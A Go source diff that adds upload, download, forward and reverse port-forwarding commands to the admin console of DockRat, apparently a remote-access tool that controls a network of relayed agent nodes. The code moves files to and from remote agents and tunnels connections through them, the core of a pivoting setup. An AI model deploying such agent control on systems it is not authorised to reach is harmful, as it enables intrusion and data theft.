@@ -4,16 +4,18 @@ import (
 	"bufio"
 	"encoding/json"
 	"fmt"
+	"io"
 	"os"
 	"strings"
 
 	"github.com/Singert/DockRat/core/node"
+	"github.com/google/uuid"
 )
 
 func StartConsole(registry *node.Registry) {
 	scanner := bufio.NewScanner(os.Stdin)
 	for {
-		fmt.Print("(admin) >> ")
+		PrintPrompt()
 		if !scanner.Scan() {
 			break
 		}
@@ -40,6 +42,14 @@ func StartConsole(registry *node.Registry) {
 			handleStartRelay(arg, registry)
 		case "topo":
 			handleTopo(registry)
+		case "upload":
+			handleUpload(arg, registry)
+		case "download":
+			handleDownload(arg, registry)
+		case "forward":
+			handleForward(arg, registry)
+		case "backward":
+			handleBackward(arg, registry)
 
 		default:
 			fmt.Println("[-] Unknown command")
@@ -177,4 +187,150 @@ func sendMessageOrRelay(nid int, msg Message, reg *node.Registry) error {
 	}
 	_, err = parentNode.Conn.Write(buf)
 	return err
+}
+func handleUpload(arg string, reg *node.Registry) {
+	parts := strings.Fields(arg)
+	if len(parts) != 3 {
+		fmt.Println("Usage: upload <id> <local> <remote>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	localPath := parts[1]
+	remotePath := parts[2]
+
+	info, err := os.Stat(localPath)
+	if err != nil {
+		fmt.Println("[-] Local file error:", err)
+		return
+	}
+
+	meta := FileMeta{
+		Filename: info.Name(),
+		Path:     remotePath,
+		Size:     info.Size(),
+	}
+	metaBytes, _ := json.Marshal(meta)
+	msg := Message{Type: MsgUpload, Payload: metaBytes}
+	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
+		fmt.Println("[-] Failed to send upload meta:", err)
+		return
+	}
+
+	// 分片上传
+	f, err := os.Open(localPath)
+	if err != nil {
+		fmt.Println("[-] Open local file failed:", err)
+		return
+	}
+	defer f.Close()
+
+	buf := make([]byte, 4096)
+	var offset int64 = 0
+	for {
+		n, err := f.Read(buf)
+		if err != nil && err != io.EOF {
+			fmt.Println("[-] Read error:", err)
+			return
+		}
+		eof := (err == io.EOF)
+
+		chunk := FileChunk{
+			Offset: offset,
+			Data:   buf[:n],
+			EOF:    eof,
+		}
+		data, _ := json.Marshal(chunk)
+		chunkMsg := Message{Type: MsgFileChunk, Payload: data}
+		if err := sendMessageOrRelay(nid, chunkMsg, reg); err != nil {
+			fmt.Println("[-] Failed to send chunk:", err)
+			return
+		}
+		offset += int64(n)
+		if eof {
+			break
+		}
+	}
+	fmt.Println("[+] Upload complete")
+}
+func handleDownload(arg string, reg *node.Registry) {
+	parts := strings.Fields(arg)
+	if len(parts) != 3 {
+		fmt.Println("Usage: download <id> <remote> <local>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	remotePath := parts[1]
+	localPath := parts[2]
+
+	// 保存目标路径 + 打开文件句柄
+	out, err := os.Create(localPath)
+	if err != nil {
+		fmt.Println("[-] Cannot create local file:", err)
+		return
+	}
+	SetFileReceiver(
+		func(offset int64, data []byte) {
+			out.WriteAt(data, offset)
+		},
+		func() {
+			out.Close()
+		},
+	)
+
+	req := DownloadRequest{Path: remotePath}
+	data, _ := json.Marshal(req)
+	msg := Message{
+		Type:    MsgDownload,
+		Payload: data,
+	}
+	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
+		fmt.Println("[-] Failed to send download request:", err)
+		return
+	}
+	fmt.Println("[+] Download request sent. Waiting for data...")
+}
+func handleForward(arg string, reg *node.Registry) {
+	parts := strings.Fields(arg)
+	if len(parts) != 3 {
+		fmt.Println("Usage: forward <id> <local_port> <remote_host:port>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	localPort := parts[1]
+	remoteTarget := parts[2]
+
+	go StartPortForward(nid, localPort, remoteTarget, reg)
+}
+
+func handleBackward(arg string, reg *node.Registry) {
+
+	parts := strings.Fields(arg)
+	if len(parts) != 3 {
+		fmt.Println("Usage: backward <id> <agent_listen_port> <admin_target>")
+		return
+	}
+	var nid, port int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	fmt.Sscanf(parts[1], "%d", &port)
+	target := parts[2]
+	// ✅ 预分配一个 connID 前缀用于匹配 agent 回传连接
+	connIDPrefix := uuid.New().String()[:8]
+	SetBackwardTargetPrefix(connIDPrefix, target, nid)
+	// 将 prefix 暂存为 "fake target"，agent 使用它构造 connID
+	payload := BackwardListenPayload{
+		ListenPort: port,
+		Target:     connIDPrefix, // ⚠️ 发送的是 connID 前缀占位
+	}
+	data, _ := json.Marshal(payload)
+	msg := Message{Type: MsgBackwardListen, Payload: data}
+
+	err := sendMessageOrRelay(nid, msg, reg)
+	if err != nil {
+		fmt.Printf("[-] Failed to send backward listen: %v\n", err)
+		return
+	}
+	fmt.Printf("[+] Instructed agent[%d] to listen on :%d (→ admin connect %s)\n", nid, port, target)
 }
